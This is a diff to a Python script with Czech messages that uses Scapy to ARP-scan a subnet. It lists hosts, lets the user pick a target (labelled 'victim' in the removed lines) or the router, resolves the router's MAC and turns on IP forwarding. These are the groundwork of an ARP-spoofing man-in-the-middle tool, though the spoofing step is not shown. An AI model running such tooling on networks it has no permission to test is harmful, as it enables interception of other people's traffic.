@@ -4,102 +4,93 @@ import subprocess
 import atexit
 import os
 
-devices = []  # Seznam nalezených zařízení
+devices = []
 
-# --- Sken sítě --- #
+
+# --- scan sítě --- #
 def scan_network():
-    ip_addr = input("[?] Zadejte IP adresu včetně prefixu (např. 192.168.1.1/24): ")
+    ip_addr = input("[?] IP rozsah (např. 192.168.1.1/24): ")
 
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
-    arp = ARP(pdst=ip_addr)
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr)
 
-    print(f"\n[*] Skenuji síť {ip_addr}...\n")
-    result = srp(ether / arp, timeout=3, verbose=0)[0]
+    print(f"\n[*] scan {ip_addr}\n")
+
+    result = srp(packet, timeout=3, verbose=0)[0]
 
     if not result:
-        print("[-] Žádná zařízení nenalezena.")
+        print("[-] nic")
         return
 
-    for counter, (sent, received) in enumerate(result, start=1):
-        devices.append({"ip": received.psrc, "mac": received.hwsrc})
-        print(f"{counter}. | IP: {received.psrc} | MAC: {received.hwsrc}")
+    devices.clear()
+
+    for i, (s, r) in enumerate(result, start=1):
+        devices.append({"ip": r.psrc, "mac": r.hwsrc})
+        print(f"{i}. {r.psrc} | {r.hwsrc}")
 
 
-# --- Výběr oběti --- #
+# --- výběr cíle --- #
 def select_target():
     if not devices:
-        print("[-] Seznam zařízení je prázdný. Nejdřív spusťte scan_network().")
-        return None, None
-
-    router_ip = conf.route.route("0.0.0.0/0")[2]
-
-    print(f"\n[+] Zjišťuji MAC adresu routeru ({router_ip})...")
-    answered_list = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip),
-        timeout=3, verbose=0
-    )[0]
-
-    if answered_list:
-        router_mac = answered_list[0][1].hwsrc
-        print(f"[+] Router: IP: {router_ip} | MAC: {router_mac}")
-    else:
-        print(f"[-] Nepodařilo se získat MAC adresu routeru ({router_ip}).")
+        print("[-] nejdřív scan")
         return None, None
 
     while True:
-        choice = input("\n[?] Zadejte číslo oběti (nebo 'r' pro router): ").strip()
-
-        if not choice:
-            print("[-] Neplatný vstup. Zkuste to znovu.")
-            continue
+        choice = input("\nčíslo cíle nebo r (router): ").strip()
 
         if choice.lower() == "r":
-            return router_ip, router_mac
+            router_ip = conf.route.route("0.0.0.0/0")[2]
+
+            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip)
+            ans = srp(packet, timeout=3, verbose=0)[0]
+
+            if ans:
+                router_mac = ans[0][1].hwsrc
+                return router_ip, router_mac
+
+            print("[-] router nenalezen")
+            continue
 
         try:
-            index = int(choice) - 1
-            if index < 0:
-                raise IndexError
-
-            target = devices[index]
-            print(f"[+] Vybrána oběť: IP: {target['ip']} | MAC: {target['mac']}")
+            idx = int(choice) - 1
+            target = devices[idx]
             return target["ip"], target["mac"]
-        except (ValueError, IndexError):
-            print("[-] Neplatný výběr. Zkuste to znovu.")
+        except:
+            print("[-] špatně")
 
 
-# --- IP forwarding --- #
+# --- router info --- #
+def get_router():
+    router_ip = conf.route.route("0.0.0.0/0")[2]
+
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip)
+    ans = srp(packet, timeout=3, verbose=0)[0]
+
+    if ans:
+        router_mac = ans[0][1].hwsrc
+        return router_ip, router_mac
+
+    return None, None
+
+
+# --- ip forwarding --- #
 def toggle_forwarding(enable=True):
     system = platform.system()
 
     if system == "Linux":
-        value = "1" if enable else "0"
-        os.system(f"sudo sysctl -w net.ipv4.ip_forward={value}")
+        os.system(f"sudo sysctl -w net.ipv4.ip_forward={1 if enable else 0}")
 
     elif system == "Windows":
         value = "Enabled" if enable else "Disabled"
-        try:
-            result = subprocess.run(
-                ["powershell", "-Command", f"Set-NetIPInterface -Forwarding {value}"],
-                capture_output=True,
-                text=True
-            )
-            if result.returncode != 0:
-                print(f"[-] CHYBA: Nepodařilo se nastavit IP forwarding.")
-                print(f"    Detail: {result.stderr.strip()}")
-                print(f"    Ujistěte se, že terminál běží JAKO SPRÁVCE.")
-            else:
-                print(f"[+] Windows IP Forwarding: {value}")
-        except FileNotFoundError:
-            print("[-] PowerShell nebyl nalezen.")
 
-    else:
-        print(f"[-] OS '{system}' není podporován.")
+        subprocess.run(
+            ["powershell", "-Command", f"Set-NetIPInterface -Forwarding {value}"],
+            capture_output=True
+        )
 
 
-# --- Cleanup při ukončení --- #
+# --- cleanup --- #
 def cleanup():
-    print("\n[+] Vypínám IP forwarding...")
     toggle_forwarding(False)
 
-atexit.register(cleanup) 
+
+atexit.register(cleanup)
